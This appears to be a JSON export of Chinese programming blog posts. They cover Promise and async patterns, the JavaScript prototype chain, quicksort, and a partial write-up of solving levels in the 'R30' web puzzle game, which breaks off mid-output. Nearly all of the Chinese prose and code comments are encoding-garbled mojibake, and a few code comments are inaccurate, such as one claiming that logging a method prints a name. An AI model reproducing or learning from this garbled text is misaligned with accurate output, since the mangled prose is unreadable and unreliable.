requestå‚³èªªä¸­çš„ callback hellï¼š 12345678910111213141516const request = require('request')request('https://reqres.in/api/users/1', function(err, res, body) { console.log('æ‹¿åˆ°ç¬¬ä¸€ç­†è³‡æ–™äº†ï¼', JSON.parse(body)) // call ä¸‹ä¸€ç­† API request('https://reqres.in/api/users/2', function(err, res, body) { console.log('æ‹¿åˆ°ç¬¬äºŒç­†è³‡æ–™äº†ï¼', JSON.parse(body)) // call ä¸‹ä¸€ç­† API request('https://reqres.in/api/users/3', function(err, res, body) { console.log('æ‹¿åˆ°ç¬¬ä¸‰ç­†è³‡æ–™äº†ï¼', JSON.parse(body)) // call ä¸‹ä¸€ç­† API request('https://reqres.in/api/users/4', function(err, res, body) { console.log('æ‹¿åˆ°ç¬¬å››ç­†è³‡æ–™äº†ï¼', JSON.parse(body)) }) }) })}) æ”¹ç”¨ Promise + asyncï¼š 12345678910111213141516171819202122232425262728293031323334~async function() { // API 1 await new Promise((resolve, reject) =&gt; { request('https://reqres.in/api/users/1', (err, res, body) =&gt; { console.log('æ‹¿åˆ°ç¬¬ä¸€ç­†è³‡æ–™äº†ï¼', JSON.parse(body)) // å¾€ä¸‹åŸ·è¡Œ resolve() }) }) // API 2 await new Promise((resolve, reject) =&gt; { request('https://reqres.in/api/users/2', (err, res, body) =&gt; { console.log('æ‹¿åˆ°ç¬¬äºŒç­†è³‡æ–™äº†ï¼', JSON.parse(body)) // å¾€ä¸‹åŸ·è¡Œ resolve() }) }) // API 3 await new Promise((resolve, reject) =&gt; { request('https://reqres.in/api/users/3', (err, res, body) =&gt; { console.log('æ‹¿åˆ°ç¬¬ä¸‰ç­†è³‡æ–™äº†ï¼', JSON.parse(body)) // å¾€ä¸‹åŸ·è¡Œ resolve() }) }) // API 4 await new Promise((resolve, reject) =&gt; { request('https://reqres.in/api/users/4', (err, res, body) =&gt; { console.log('æ‹¿åˆ°ç¬¬å››ç­†è³‡æ–™äº†ï¼', JSON.parse(body)) // å¾€ä¸‹åŸ·è¡Œ resolve() }) })}() åŒå ´åŠ æ˜  Promise çš„åŸæœ¬ç”¨æ³•æš«æ™‚å…ˆæ”¾é€™å§ï¼ä¸ç„¶æˆ‘ä¹Ÿä¸çŸ¥é“è©²æ”¾å“ªæ‰å¥½ï½ 12345678910111213141516171819202122232425262728293031// æ ¹æ“š id å–å¾— user è³‡æ–™function getUser(id) { return new Promise((resolve, reject) =&gt; { request(`https://reqres.in/api/users/${id}`, (err, res, body) =&gt; { // æˆåŠŸæ‹¿åˆ°è³‡æ–™ if (body) { // å°±æŠŠè³‡æ–™å¸¶å›å» resolve(body) } else { // å¤±æ•—å°±å¸¶éŒ¯èª¤å›å» reject(err) } }) })}// å¾ç¬¬ä¸€ç­†é–‹å§‹ç™¼getUser(1) .then((data) =&gt; { console.log('ç¬¬ä¸€ç­†è³‡æ–™ï¼' ,JSON.parse(data)) return getUser(2) }) .then((data) =&gt; { console.log('ç¬¬äºŒç­†è³‡æ–™ï¼', JSON.parse(data)) return getUser(3) }) .then((data) =&gt; { console.log('ç¬¬ä¸‰ç­†è³‡æ–™ï¼', JSON.parse(data)) }) .catch((err) =&gt; console.log('err:', err)) .catch((err) =&gt; console.log('err:', err)) .catch((err) =&gt; console.log('err:', err)) åŒå ´åŠ æ˜  async çš„åŸæœ¬ç”¨æ³•12345678910111213141516171819202122232425262728293031323334353637// æ ¹æ“š id å–å¾— user è³‡æ–™function getUser(id) { return new Promise((resolve, reject) =&gt; { request(`https://reqres.in/api/users/${id}`, (err, res, body) =&gt; { // æˆåŠŸæ‹¿åˆ°è³‡æ–™ if (body) { // å°±æŠŠè³‡æ–™å¸¶å›å» resolve(body) } else { // å¤±æ•—å°±å¸¶éŒ¯èª¤å›å» reject(err) } }) })}~async function() { /* ä¾åºå–å¾— user1, user2, user3ï¼Œ åŠ  {} æ˜¯ç‚ºäº†å»ºç«‹å€å¡Šä½œç”¨åŸŸï¼Œ ä¸ç„¶æ²’è¾¦æ³•é‡è¤‡ç”¨ data ä¾†è§£æ§‹ */ { const json = await getUser(1) const { data } = JSON.parse(json) console.log(data) } { const json = await getUser(2) const { data } = JSON.parse(json) console.log(data) } { const json = await getUser(3) const { data } = JSON.parse(json) console.log(data) }}() æˆ–æ­é…è¿´åœˆå¯«çš„æ›´ç°¡æ½”ï¼š 1234567891011121314151617181920212223// æ ¹æ“š id å–å¾— user è³‡æ–™function getUser(id) { return new Promise((resolve, reject) =&gt; { request(`https://reqres.in/api/users/${id}`, (err, res, body) =&gt; { // æˆåŠŸæ‹¿åˆ°è³‡æ–™ if (body) { // å°±æŠŠè³‡æ–™å¸¶å›å» resolve(body) } else { // å¤±æ•—å°±å¸¶éŒ¯èª¤å›å» reject(err) } }) })}~async function() { for (let i=1; i&lt;=3; i++) { // æ¯åœˆéƒ½æœƒå…ˆç­‰é€™è¡ŒåŸ·è¡Œå®Œæ‰å¾€ä¸‹åŸ·è¡Œ const json = await getUser(i) const { data } = JSON.parse(json) console.log(i, data) }}() åŒå ´åŠ æ˜  async çš„å›å‚³å€¼ä¹Ÿæ˜¯ä¸€å€‹ Promiseåªè¦å›å‚³çš„æ˜¯ Promiseï¼Œå°±å¯ä»¥ä¸€ç›´ then ä¸‹å»ï¼š 123456789101112131415161718async function user1() { const json = await getUser(1) console.log({ data } = JSON.parse(json))}/* å…ˆæŠ“ç¬¬ä¸€ç­† userï¼Œæ¥è‘— .then: æŠ“ç¬¬äºŒç­†ï¼Œæ³¨æ„è£¡é¢ä¹Ÿæ˜¯ async å‡½å¼ï¼Œå› æ­¤æœ€å¾Œå›å‚³ Promise .then: æŠ“ç¬¬ä¸‰ç­†ï¼ŒåŒä¸Š*/user1() .then(async() =&gt; { const json = await getUser(2) console.log({ data } = JSON.parse(json)) }) .then(async() =&gt; { const json = await getUser(3) console.log({ data } = JSON.parse(json)) }) åŒå ´åŠ æ˜  æ¯” setTimeout é›£ä¸€é»çš„ setIntervalå¸Œæœ›ä½ èƒ½æˆç‚ºéåŒæ­¥æ“æ§å¤§å¸«ï¼š 123456789101112131415161718192021222324252627282930function count(msg, ms) { return new Promise((resolve, reject) =&gt; { // è¨ˆæ•¸å™¨ let counter = 0 // å»ºç«‹è¨ˆæ•¸å™¨ let timer = setInterval(() =&gt; { /* callback æµç¨‹ 1. å…ˆæŠŠ counter + 1 2. å°å‡ºè¼¸å…¥çš„æ–‡å­— + counter 3. æª¢æŸ¥ counter å€¼ï¼Œè¶…é 5 å°±ç§»é™¤è¨ˆæ•¸å™¨ */ counter++ console.log(`${msg}: ${counter}`) if (counter === 5) { // æ¸…é™¤è¨ˆæ™‚å™¨ clearInterval(timer) // ç­‰è¨ˆæ•¸å™¨æ¸…é™¤å¾Œï¼Œæ‰åŸ·è¡Œ resolve resolve() } }, ms) })}~async function() { console.log('1') // ç­‰åˆ° resolve è¢«åŸ·è¡Œå¾Œæ‰æœƒå¾€ä¸‹è·‘ await count('yo', 100) console.log('2')}() è€å¸¥çš„å¯«æ³•ï¼ˆå…¶å¯¦è·Ÿä¸Šé¢ä¸€æ¨¡ä¸€æ¨£ï¼‰ï¼š 12345678910111213141516171819~async function() { console.log(1) await new Promise((resolve, reject) =&gt; { // IIFE ~function(msg, ms) { let counter = 0 const timer = setInterval(() =&gt; { counter++ console.log(`${msg}: ${counter}`) if (counter === 5) { clearInterval(timer) resolve() } }, ms) }('yo', 100) // IIFE END }) console.log(2)}() åŒå ´åŠ æ˜  æ›´å¥½æ‡‚çš„æ’åºæ–¹å¼123456789101112131415161718192021222324252627282930313233const request = require('request')async function getUser(id) { // å„²å­˜ response let json = null await new Promise((resolve) =&gt; { request({ url: `https://reqres.in/api/users/${id}`, }, (err, res, body) =&gt; { // æ‹¿åˆ° response json = body // æ‰å¾€ä¸‹åŸ·è¡Œ resolve() }) }) // å›å‚³æ‹¿åˆ°çš„è³‡æ–™ return json}function getAllUsers(user1, user2, user3) { console.log('user1', JSON.parse(user1)) console.log('user2', JSON.parse(user2)) console.log('user3', JSON.parse(user3))}/* ä¸»è¦çš„ function */~async function() { // æŒ‰ç…§é †åºå–å¾— 1, 2, 3 çš„è³‡æ–™ const user1 = await getUser(1) const user2 = await getUser(2) const user3 = await getUser(3) // æ‹¿åˆ°ä¹‹å¾Œå†ä¸Ÿçµ¦è¦è™•ç†çš„ function getAllUsers(user1, user2, user3)}() å–å¾—æ‰€æœ‰è³‡æ–™ Promise.Allç•¶ä½ æƒ³ä¸€æ¬¡æ‰“å¤šå€‹ API æ™‚ï¼Œæ‡‰è©²å°±æœƒç”¨åˆ°é€™å€‹æ–¹æ³•ï¼š 123456789101112131415161718192021222324252627282930313233// å¯ä»¥æ”¹æˆ false ä¾†æ¸¬è©¦let data = { name: 'jim', email: 'jimjim@gmail.com' }const youtubeAPI = new Promise(resolve =&gt; { setTimeout(() =&gt; { resolve({ video: [1, 2, 3, 4, 5] }) }, 3000)})const facebookAPI = new Promise(resolve =&gt; { setTimeout(() =&gt; { resolve({ user: 'name' }) }, 1000)})const checkPermission = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { data ? resolve(data) : reject(`We don't find the data.`) }, 2000)})Promise.all([youtubeAPI, facebookAPI, checkPermission]).then(result =&gt; { // æ‹¿åˆ°æ‰€æœ‰çµæœ console.log(result[0]) console.log(result[1]) console.log(result[2])}).catch(err =&gt; { // åªè¦å…¶ä¸­ä¸€å€‹å‡ºéŒ¯ï¼Œå°±è·³åˆ°é€™è£¡ console.log(err);})","link":"/2022/01/22/promise-trick/"},{"title":"ç†è§£åŸå‹éŠçš„é‹ä½œ","text":"ç­‰é€™ä¸€å¤©å¥½ä¹…äº†ã€‚ ç°¡è¿°åœ¨ ES5 å¯¦ä½œç‰©ä»¶å°å‘ è£¡æœ‰æåˆ°é€éã€Œprototypeã€å¯ä»¥è®“æ¯å€‹ instance åƒè€ƒåˆ°åŒä¸€å€‹ functionã€‚ä½†ä¸¦æ²’æœ‰è§£é‡‹å¯¦éš›ä¸Šæ˜¯æ€éº¼åšåˆ°çš„ï¼Ÿæ‰€ä»¥é€™é‚Šå°±ä¾†è§£é‡‹ä¸€ä¸‹ã€‚ é¦–å…ˆæœ‰å€‹æ±è¥¿å«åš __proto__ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯ï¼š å¦‚æœåœ¨é€™å€‹ instance ä¸Šæ‰¾ä¸åˆ°ï¼Œå°±å»å®ƒçš„ prototype æ‰¾æ‰¾çœ‹ã€‚ ä¾†èˆ‰å€‹ä¾‹å­ï¼š 123456789101112function Person (name) { this.name = name;}Person.prototype.getName = function () { console.log(this.name);}Person.prototype.setName = function (newName) { this.name = newName;}const peanu = new Person('PeaNu');console.log(peanu.getName); // PeaNu æŒ‰ç…§å‰é¢æ‰€èªªï¼Œpeanu æœ¬èº«æ²’æœ‰ getNameï¼Œæ‰€ä»¥æœƒé€é __proto__ å»æ‰¾åˆ°ä¸Šä¸€å±¤ prototypeï¼š 1234// Person: {getName: [Function (anonymous)]}console.log(peanu.__proto__);// trueconsole.log(peanu.__proto__ === Person.prototype); æ‰€ä»¥èƒŒå¾Œå°±æ˜¯é€é __proto__ ä¾†æ‰¾åˆ° Person.prototype å†æ‰¾åˆ° getName çš„ã€‚ ä½†ã€Œå¾€ä¸Šæ‰¾ã€é€™å€‹å‹•ä½œå…¶å¯¦èƒ½åšå¾ˆå¤šæ¬¡ï¼Œæ‰€ä»¥å®ƒçš„å®Œæ•´æµç¨‹æœƒæ˜¯é€™æ¨£ï¼š peanu æœ‰æ²’æœ‰ getName æ²’æœ‰ï¼Ÿé‚£peanu.__proto__ æœ‰æ²’æœ‰ getName =&gt; Person.prototype æ²’æœ‰ï¼Ÿé‚£ peanu.__proto__.__proto__ æœ‰æ²’æœ‰ getName =&gt; Object.prototype æ²’æœ‰ï¼Ÿé‚£ peanu.__proto__.__proto__.__proto__ æœ‰æ²’æœ‰ getName =&gt; null é€™ä¸€é€£ä¸²çš„éç¨‹å°±ç¨±ç‚ºã€ŒPrototype chainï¼ˆåŸå‹éŠï¼‰ã€ï¼Œå› ç‚ºé€é __proto__ ä¸€ç›´å¾€ä¸Šæ‰¾ï¼Œå¾€ä¸Šæ‰¾ï¼Œå¾€ä¸Šæ‰¾ã€‚å°±è·Ÿ Scope chain çš„æ¦‚å¿µæ˜¯ä¸€æ¨£çš„ã€‚ ç•¶åŸå‹éŠæ‰¾åˆ°é ‚çš„æ™‚å€™å°±æœƒå›å‚³ nullï¼Œæ‰€ä»¥åªæœ‰åœ¨éƒ½æ‰¾ä¸åˆ°çš„æƒ…æ³ä¸‹æ‰æœƒå™´ Errorã€‚ å¯¦ä½œåŸå‹éŠç†è§£ä¸Šé¢çš„è§€å¿µå¾Œï¼Œå°±å¯ä»¥ä¾†å¯¦ä½œé€™å€‹æµç¨‹ï¼š 12345678910111213141516171819202122232425262728function Person (name) { this.name = name;}// ç¶åœ¨ Object ä¸ŠObject.prototype.getName = function () { console.log('Object', this.name);}// ç¶åœ¨ Person ä¸ŠPerson.prototype.getName = function () { console.log('Peson', this.name)}function prototypeChain (instance, methods) { // åˆ°é ‚äº† if (instance.__proto__ === null) { throw new Error('Can not find methods'); } // æ‰¾åˆ°äº† if (instance.__proto__[methods]) { // ç”¨ call ä¾†å‘¼å«ï¼Œä¸¦ä¸”è®“ this æŒ‡å‘ instance return instance.__proto__[methods].call(instance); } return prototypeChain(instance.__proto__, methods);}const peanu = new Person('peanu');prototypeChain(peanu, 'getName'); é€™é‚ŠåŒæ™‚åœ¨ Object å’Œ Person éƒ½ç¶ä¸Š getName æ˜¯ç‚ºäº†æ¨¡æ“¬ã€Œå¾€ä¸Šæ‰¾ã€é€™å€‹å‹•ä½œã€‚ ç•¶å…©å€‹åŒæ™‚å­˜åœ¨æ™‚ï¼Œ Person æœƒå…ˆè¢«æ‰¾åˆ°ï¼Œæ‰€ä»¥æœƒå‘¼å« Person.prototype.getNameï¼›åªæœ‰ Object å­˜åœ¨æ™‚å°±æœƒå‘¼å« Object.prototype.getNameï¼›å¦‚æœéƒ½ä¸å­˜åœ¨ï¼Œæœ€å¾Œæœƒæ‰¾åˆ°é ‚ï¼ŒåŸ·è¡Œ throw new Errorã€‚ é€™å€‹å°±æ˜¯åŸå‹éŠçš„æµç¨‹ï¼Œåšå®Œå¾Œæ„Ÿè¦ºæ›´ç†è§£äº†ã€‚ æœ€å¾Œçµ¦å€‹å°ç¯„ä¾‹ï¼Œè®“ä½ æ›´æ¸…æ¥šæ¯å€‹è³‡æ–™å‹åˆ¥å°æ‡‰çš„ prototype æ˜¯èª°ï¼š 12345678910111213function Person () {}const obj = {};const arr = [];const str = '123';const bool = false;const num = 123;console.log(Person.__proto__ === Function.prototype);console.log(obj.__proto__ === Object.prototype);console.log(arr.__proto__ === Array.prototype);console.log(str.__proto__ === String.prototype);console.log(bool.__proto__ === Boolean.prototype);console.log(num.__proto__ === Number.prototype); å…¶ä»–å’ŒåŸå‹éŠæœ‰é—œçš„ methodhasOwnProperty ç”¨ä¾†æª¢æŸ¥ä¸€å€‹ method æ˜¯åœ¨ instance èº«ä¸Šé‚„æ˜¯åœ¨ prototype èº«ä¸Šï¼š 12345678910function Person (name) { this.name = name;}Person.prototype.getName = function () { console.log(this.name);}const peanu = new Person('peanu');console.log(peanu.hasOwnProperty('getName')) // falseconsole.log(peanu.__proto__.hasOwnProperty('getName')) // true instanceof æª¢æŸ¥ A æ˜¯ä¸æ˜¯ B çš„ instanceï¼š 123456789function Person (name) { this.name = name;}const peanu = new Person('peanu');console.log(peanu instanceof Person); // trueconsole.log(peanu instanceof Object); // trueconsole.log(peanu instanceof Array); // falseconsole.log(peanu instanceof Function); // false é€™é‚Šä¹Ÿè‡ªå·±å¯¦ä½œäº†ä¸€ä¸‹ï¼š 12345678910111213141516function Person (name) { this.name = name;}const peanu = new Person('peanu');function myinstanceof (instance, compare) { if (instance.__proto__ === null) return false if (instance.__proto__ === compare.prototype) return true return myinstanceof(instance.__proto__, compare);}console.log(myinstanceof(peanu, Person)); // trueconsole.log(myinstanceof(peanu, Object)); // trueconsole.log(myinstanceof(peanu, Array)); // falseconsole.log(myinstanceof(peanu, Function)); // false constructorï¼ˆå±¬æ€§ï¼‰ æ¯å€‹ prototype éƒ½æœƒæœ‰ constructor å±¬æ€§ï¼Œé€™å€‹å€¼å°±æ˜¯å»ºæ§‹å‡½å¼è‡ªå·±ï¼š 123456789101112131415function Person (name) { this.name = name;}Person.prototype.getName = function () { console.log(this.name);}const peanu = new Person('peanu');// å¦‚æœæ˜¯é€é instance ä¾†æ‰¾çš„è©±ï¼Œå¯¦éš›æ˜¯é€éåŸå‹éŠä¾†å¾€ä¸Šæ‰¾çš„console.log(peanu.constructor === Person); // trueconsole.log(peanu.hasOwnProperty('constructor')) // falseconsole.log(Person.prototype.constructor === Person); // trueconsole.log(Person.prototype.hasOwnProperty('constructor')) // true;","link":"/2022/03/18/prototype-chain/"},{"title":"å¿«é€Ÿæ’åºæ³•ï¼ˆQuick-sortï¼‰","text":"ä¸€æ¨£æ˜¯å¤§è…¦æ‡‚ï¼Œä½†ç¨‹å¼ç¢¼æŠ½è±¡QQã€‚ æ¦‚å¿µå…ˆé¸å®šä¸€å€‹æ•¸å­—ç•¶åŸºæº–é»ï¼Œæ¥è‘—æŠŠå‰©ä¸‹çš„æ•¸åˆ—åˆ†çµ„ï¼Œæ¯”åŸºæº–é»ã€Œå°çš„æ”¾å·¦é‚Šã€ï¼Œã€Œå¤§çš„æ”¾å³é‚Šã€ã€‚ æ¥è‘—åˆ©ç”¨ã€Œéè¿´ã€çš„æ¦‚å¿µï¼ŒæŠŠå¥½åˆ†çµ„çš„æ•¸åˆ—å†é‡è¤‡ä¸€æ¬¡å‰›å‰›çš„æ­¥é©Ÿï¼Œç›´åˆ°å‰©ä¸‹ã€Œç©ºå…ƒç´ æˆ–ä¸€å€‹å…ƒç´ ç‚ºæ­¢ã€ æµç¨‹åœ–ï¼š å¯¦ä½œ1234567891011121314151617181920212223242526272829function quickSort(arr) { // åœæ­¢é»ï¼Œç•¶ arr é•·åº¦ç‚º 1 æˆ–æ²’æœ‰å…ƒç´ äº† if (arr.length &lt;= 1) { return arr } // åŸºæº–é» index const pivotIndex = Math.floor(arr.length / 2) // åŸºæº–é» number const pivotNumber = arr.splice(pivotIndex, 1)[0] // æ¯”åŸºæº–é»å°çš„æ•¸åˆ— let samllerNumbers = [] // æ¯”åŸºæº–é»å¤§çš„æ•¸åˆ— let biggerNumbers = [] // æŠŠå°çš„æ”¾åˆ° samllï¼Œå¤§çš„æ”¾åˆ° bigger for (let i=0; i&lt;arr.length; i++) { if (arr[i] &lt; pivotNumber) { samllerNumbers.push(arr[i]) } else { biggerNumbers.push(arr[i]) } } // æŠŠå°çš„è·Ÿå¤§çš„éƒ½ä¸Ÿåˆ° quickSort éè¿´ï¼Œæœ€å¾Œè¦è·Ÿ pivot çµåˆèµ·ä¾† return quickSort(samllerNumbers).concat([pivotNumber], quickSort(biggerNumbers))}const numbers = [5, 44, 23, 3, 42, 4, 2]console.log(quickSort(numbers)) è©³ç´°æµç¨‹ï¼š 12345678910111213141516171819202122232425262728293031// æ‹†è§£æµç¨‹pivotNumber: 3samllerNumbers: [ 2 ]biggerNumbers: [ 5, 44, 23, 42, 4 ]pivotNumber: 23samllerNumbers: [ 5, 4 ]biggerNumbers: [ 44, 42 ]pivotNumber: 4samllerNumbers: []biggerNumbers: [ 5 ]pivotNumber: 42samllerNumbers: []biggerNumbers: [ 44 ]// æ¥ä¸‹ä¾†è¦ return å›å»pivotNumber: 42return [].concat([ 42 ], [ 44 ]) =&gt; [ 42, 44 ] =&gt; [ 42, 44 ]pivotNumber: 4return [ ].concat([ 4 ], [ 5 ]) =&gt; [ 4, 5 ]pivotNumber: 23return [ 4, 5 ].concat([ 23 ], [ 42, 44 ]) =&gt; [ 4, 5, 23, 42, 44 ]pivotNumber: 3return [ 2 ].concat([ 3 ], [ 4, 5, 23, 42, 44 ]) =&gt; [ 2, 3, 4, 5, 23, 42, 44 ]resultï¼š[2, 3, 4, 5, 23, 42, 44] æˆ–è€…åƒè€ƒä¸‹é¢çš„åœ–ï¼š çµèªä¸Šé¢çš„åšæ³•å…¶å¯¦ä¸æ˜¯æœ€å¥½çš„å¯«æ³•ï¼Œä½†å„ªé»æ˜¯å¯è®€æ€§æ¯”è¼ƒå¥½ã€‚ ç­‰æœªä¾†æ¯”è¼ƒç†è§£ä¸€é»å¾Œå¯ä»¥åƒè€ƒï¼šé€™ç¯‡ ç¬¬äºŒç¨®ä½œæ³•éè¿´çš„éƒ¨åˆ†çœ‹ä¸å¤ªæ‡‚æ˜¯æ€éº¼éè¿´çš„ï¼Œæ‰€ä»¥å…ˆæš«æ™‚æ”¾åœ¨é€™è£¡ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// æ›ä½ç½®function swap(array, i, j) { let temp = array[i] array[i] = array[j] array[j] = temp}/* array = æ•¸åˆ— start = æœç´¢èµ·é» end = æœç´¢çµ‚é»*/function divide(array, start, end) { // pivot = æœ€å¾Œä¸€å€‹æ•¸å­— const pivot = array[end-1] // æŒ‡æ¨™åˆå§‹å€¼ï¼ˆèµ·é»çš„å‰ä¸€å€‹ä½ç½®ï¼‰ let index = start - 1 // éæ­·æ•¸åˆ— for (let i=start; i&lt;end-1; i++) { // æ•¸å­—æ¯” pivot å° if (array[i] &lt; pivot) { // å…ˆæŠŠ index å¾€å³ç§» index++ // åœ¨æŠŠæ•¸å­—æ”¾åˆ° index çš„ä½ç½® swap(array, i, index) } } /* æ›´æ–° pivot çš„ä½ç½® end-1: pivot åŸæœ¬çš„ä½ç½® index+1: pivot è©²æ”¾åˆ°çš„ä½ç½® */ swap(array, index+1, end-1) // å›å‚³æœ€å¾Œ pivot çš„ä½ç½® return index+1}function quickSort(array, start, end) { // è¨­å®šæœå°‹çµ‚é»åˆå§‹å€¼ end = end || array.length if (start &lt; end-1) { // æœ€å¾Œ pivot çš„ä½ç½® const lastPivotPosition = divide(array, start, end) // éè¿´å·¦åŠé‚Šçš„æ•¸åˆ—ï¼ˆæ¯” pivot å°çš„ï¼‰ quickSort(array, start, lastPivotPosition) // éè¿´å³åŠé‚Šçš„æ•¸åˆ—ï¼ˆæ¯” pivot å¤§çš„ï¼‰ quickSort(array, lastPivotPosition+1, end) } return array}const numbers = [15, 12, 3, 2, 7]quickSort(numbers, 0, numbers.length)console.log(numbers)","link":"/2022/01/17/quick-sort/"},{"title":"R30 ç•°ä¸–ç•Œç¶²ç«™æŒ‘æˆ°ï¼ç°¡çŸ­ç´€éŒ„","text":"ç•™å€‹ç´€éŒ„ã€‚ ç°¡è¿°é¦–å…ˆé€™éŠæˆ²æ˜¯ä¾†è‡ªï¼šr3:0 ç•°ä¸–ç•Œç¶²ç«™æŒ‘æˆ° é€™ç¯‡ä¸æ˜¯æ”»ç•¥æ–‡ï¼Œåªæ˜¯å–®ç´”æŠŠæˆ‘å¡ç‰¹åˆ¥ä¹…çš„é—œå¡åšç´€éŒ„ã€‚å¦‚æœæƒ³çœ‹è©³ç´°çš„æ”»ç•¥æ–‡ç›´æ¥ Google éŠæˆ²åç¨±å°±æœƒçœ‹åˆ°ä¸€å¤§å †äº†ã€‚ é—œå¡äº” https://r30challenge.herokuapp.com/lv5.php?token=csspersona! é€™é—œå…¶å¯¦æˆ‘æ—©å°±ç”¨ devtool &gt; network ç™¼ç¾ https://r30challenge.herokuapp.com/js/lv5.js è£¡é¢å¯«è‘—ï¼š 1window.location='./lv6.php?token=fail'; å°±æ˜¯å› ç‚ºåŸ·è¡Œäº†é€™ä¸€è¡Œæ‰è¢«è½‰å€ã€‚ è®“æˆ‘å¡å¾ˆä¹…çš„åœ°æ–¹æ˜¯æˆ‘æƒ³ä¸åˆ°æ€éº¼é˜»æ­¢ JS åšå£äº‹ï¼Œçœ‹å®Œæ”»ç•¥æ–‡å¾Œæ‰çŸ¥é“åŸä¾†æ˜¯åœ¨è½‰å€å‰å°± ESC ä¾†é˜»æ­¢ï¼Œæœ‰å¤ æ®˜å¿µâ€¦ é—œå¡å https://r30challenge.herokuapp.com/lv10.php?token=EFEFABMN é€™ä¸€é—œå°±æ˜¯æŠŠé€™å€‹ function è§£å‡ºä¾†ï¼š 123456789101112function isTokenValid($token) { if (strlen($token) !== 8) return false; for($i = 1; $i &lt;= 7; $i+=2) { if (( ord($token[$i]) * ord($token[$i - 1]) ) % $i !== 0) { return false; } } return true; } if (strlen($token) !== 8) return false; æ„æ€æ˜¯ token æ˜¯é•·åº¦ç‚º 8 çš„å­—ä¸²ã€‚ è‡³æ–¼è¿´åœˆçš„éƒ¨åˆ†å¯ä»¥å…ˆç…§è‘—å¯«ï¼Œé€™æ¨£å°±æ¯”è¼ƒå¥½åˆ†æé‚è¼¯äº†ï¼š 12345678# ç¬¬ä¸€åœˆchar[0] * char[1] % 1 === 0 # ç¬¬äºŒåœˆchar[2] * char[3] % 3 === 0# ç¬¬ä¸‰åœˆchar[4] * char[5] % 5 === 0# ç¬¬å››åœˆchar[6] * char[7] % 7 === 0 æ‰€ä»¥é€™é‚Šèƒ½çœ‹å‡ºæ˜¯æ‰¾å‡ºç›¸ä¹˜çµæœæ˜¯ 1, 3, 5, 7 å€æ•¸çš„å…©å€‹æ•¸å­—ã€‚ çŸ¥é“é‚è¼¯å¾Œ function å°±ä¸é›£å¯«äº†ï¼š å‚™è¨»ï¼šå› ç‚º 0 ~ 32 çš„ ASCII æ˜¯ç³»çµ±å­—å…ƒï¼Œæ‰€ä»¥é€™é‚Šä¸è€ƒæ…® 123456789101112131415161718192021function findCommonMultiple(n) { let collection = []; // å¾ 33 ~ 126 æ‰¾å‡ºå€æ•¸ for (let i=34; i&lt;=126; i++) { // å‰ä¸€å€‹æ•¸å­— x ç›®å‰æ•¸å­—æ±‚é¤˜æ•¸ if ((i-1) * i % n === 0) { // æ˜¯å€æ•¸å°±è½‰æˆå­—å…ƒ push åˆ°é™£åˆ—è£¡ collection.push([String.fromCharCode(i-1), String.fromCharCode(i)]); } } // æ‰€æœ‰ç¬¦åˆçš„å­—ä¸² return collection;}// å„²å­˜çµæœconst total = []// åˆ†åˆ¥æ‰¾å‡º 1, 3, 5, 7 çš„å€æ•¸for (let i=1; i&lt;=7; i+=2) { total.push(findCommonMultiple(i));}// å°å‡ºçµæœconsole.log(total); Outputï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677[ // 1 çš„å€æ•¸ [ [ '!', '\"' ], [ '\"', '#' ], [ '#', '$' ], [ '$', '%' ], [ '%', '&amp;' ], [ '&amp;', \"'\" ], [ \"'\", '(' ], [ '(', ')' ], [ ')', '*' ], [ '*', '+' ], [ '+', ',' ], [ ',', '-' ], [ '-', '.' ], [ '.', '/' ], [ '/', '0' ], [ '0', '1' ], [ '1', '2' ], [ '2', '3' ], [ '3', '4' ], [ '4', '5' ], [ '5', '6' ], [ '6', '7' ], [ '7', '8' ], [ '8', '9' ], [ '9', ':' ], [ ':', ';' ], [ ';', '&lt;' ], [ '&lt;', '=' ], [ '=', '&gt;' ], [ '&gt;', '?' ], [ '?', '@' ], [ '@', 'A' ], [ 'A', 'B' ], [ 'B', 'C' ], [ 'C', 'D' ], [ 'D', 'E' ], [ 'E', 'F' ], [ 'F', 'G' ], [ 'G', 'H' ], [ 'H', 'I' ], [ 'I', 'J' ], [ 'J', 'K' ], [ 'K', 'L' ], [ 'L', 'M' ], [ 'M', 'N' ], [ 'N', 'O' ], [ 'O', 'P' ], [ 'P', 'Q' ], [ 'Q', 'R' ], [ 'R', 'S' ], [ 'S', 'T' ], [ 'T', 'U' ], [ 'U', 'V' ], [ 'V', 'W' ], [ 'W', 'X' ], [ 'X', 'Y' ], [ 'Y', 'Z' ], [ 'Z', '[' ], [ '[', '\\\\' ], [ '\\\\', ']' ], [ ']', '^' ], [ '^', '_' ], [ '_', '`' ], [ '`', 'a' ], [ 'a', 'b' ], [ 'b', 'c' ], [ 'c', 'd' ], [ 'd', 'e' ], [ 'e', 'f' ], [ 'f', 'g' ], [ 'g', 'h' ], [ 'h', 'i' ], [ 'i', 'j' ], [ 'j', 'k' ], [ 'k', 'l' ], [ 'l', 'm' ], [ 'm', 'n' ], [ 'n', 'o' ], [ 'o', 'p' ], [ 'p', 'q' ], [ 'q', 'r' ], [ 'r', 's' ], [ 's', 't' ], [ 't', 'u' ], [ 'u', 'v' ], [ 'v', 'w' ], [ 'w', 'x' ], [ 'x', 'y' ], [ 'y', 'z' ], [ 'z', '{' ], [ '{', '|' ], [ '|', '}' ], [ '}', '~' ] ], // 3 çš„å€æ•¸ [ [ '!', '\"' ], [ '#', '$' ], [ '$', '%' ], [ '&amp;', \"'\" ], [ \"'\", '(' ], [ ')', '*' ], [ '*', '+' ], [ ',', '-' ], [ '-', '.' ], [ '/', '0' ], [ '0', '1' ], [ '2', '3' ], [ '3', '4' ], [ '5', '6' ], [ '6', '7' ], [ '8', '9' ], [ '9', ':' ], [ ';', '&lt;' ], [ '&lt;', '=' ], [ '&gt;', '?' ], [ '?', '@' ], [ 'A', 'B' ], [ 'B', 'C' ], [ 'D', 'E' ], [ 'E', 'F' ], [ 'G', 'H' ], [ 'H', 'I' ], [ 'J', 'K' ], [ 'K', 'L' ], [ 'M', 'N' ], [ 'N', 'O' ], [ 'P', 'Q' ], [ 'Q', 'R' ], [ 'S', 'T' ], [ 'T', 'U' ], [ 'V', 'W' ], [ 'W', 'X' ], [ 'Y', 'Z' ], [ 'Z', '[' ], [ '\\\\', ']' ], [ ']', '^' ], [ '_', '`' ], [ '`', 'a' ], [ 'b', 'c' ], [ 'c', 'd' ], [ 'e', 'f' 